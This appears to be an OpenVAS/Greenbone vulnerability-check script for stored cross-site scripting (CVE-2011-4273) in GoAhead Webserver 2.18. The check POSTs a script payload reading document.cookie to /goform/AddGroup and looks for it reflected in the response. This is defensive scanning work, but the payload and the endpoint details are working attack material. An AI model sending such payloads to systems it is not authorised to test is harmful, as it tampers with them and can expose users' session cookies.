if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802270" );
	script_version( "2020-05-08T11:13:33+0000" );
	script_cve_id( "CVE-2011-4273" );
	script_bugtraq_id( 50039 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "creation_date", value: "2011-11-08 16:16:16 +0530 (Tue, 08 Nov 2011)" );
	script_tag( name: "last_modification", value: "2020-05-08 11:13:33 +0000 (Fri, 08 May 2020)" );
	script_name( "GoAhead Webserver Multiple Stored Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/384427" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "gb_goahead_detect.sc" );
	script_mandatory_keys( "embedthis/goahead/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session
  in the context of an affected site." );
	script_tag( name: "affected", value: "GoAhead Webserver version 2.18" );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user-supplied
  input via the 'group' parameter to goform/AddGroup, related to addgroup.asp,
  the 'url' parameter to goform/AddAccessLimit, related to addlimit.asp,
  or the 'user' or 'group' parameter to goform/AddUser, related to adduser.asp" );
	script_tag( name: "solution", value: "Update to version 2.5 or later." );
	script_tag( name: "summary", value: "This host is running GoAhead Webserver and is prone to multiple
  stored cross site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.goahead.com/products/webserver/default.aspx" );
	exit( 0 );
}
CPE = "cpe:/a:embedthis:goahead";
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
get_app_location( cpe: CPE, port: port );
url = "/goform/AddGroup/addgroup.asp";
req = http_post( port: port, item: url, data: "group=<script>alert(document.cookie)</script>&privilege=4&method=1&enabled=on&ok=OK" );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

